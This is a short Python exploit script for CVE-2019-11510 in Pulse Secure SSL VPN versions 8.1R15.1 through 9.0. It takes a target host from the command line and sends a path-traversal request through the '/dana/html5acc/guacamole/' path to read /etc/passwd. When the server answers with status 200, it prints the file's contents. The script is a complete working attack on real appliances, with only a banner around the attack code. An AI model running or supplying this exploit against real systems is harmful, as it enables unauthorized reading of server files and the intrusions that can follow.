#!/bin/python

import sys
import requests

def banner():
    print ('''
      #####  #     # #######        #####    ###     #    #####          #     #   #######   #     ###
     #     # #     # #             #     #  #   #   ##   #     #        ##    ##   #        ##    #   #
     #       #     # #                   # #     # # #   #     #       # #   # #   #       # #   #     #
     #       #     # #####   #####  #####  #     #   #    ###### #####   #     #   ######    #   #     #
     #        #   #  #             #       #     #   #         #         #     #         #   #   #     #
     #     #   # #   #             #        #   #    #   #     #         #     #   #     #   #    #   #
      #####     #    #######       #######   ###   #####  #####        ##### #####  #####  #####   ###
    Version: 0.1
    Description:
        Pulse Secure 8.1R15.1/8.2/8.3/9.0 SSL VPN - Arbitrary File Disclosure
    Author: es0
    ''')

def check_exploitable(url):

    path = '/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/'
    print("[+] Sending request ---> https://" + url) # + path)
    r = requests.get("https://" + url + path)
    #print("Response code: " + str(r.status_code))
    print ("[+] Checking if " + url + " vulnerable to cve-2019-11510...")
    if r and r.status_code == 200:
        print ("[*] VULNERABLE!")
        data = r.text
        print("[*] RESULTS: ")
        print(data)
    else:
        if r.status_code == 404:
            print("[+] Not vulnerable.. :(")
        else:
            print("[!!] Response code: " + str(r.status_code))
            print("ERROR derp..please try again..")


def main():
    banner()
    if len(sys.argv) == 2:
        url = sys.argv[1]
        check_exploitable(url)
    else:
        print("USAGE:\t python3 CVE-2019-11510.py <URL>")


if __name__ == '__main__':
  main()
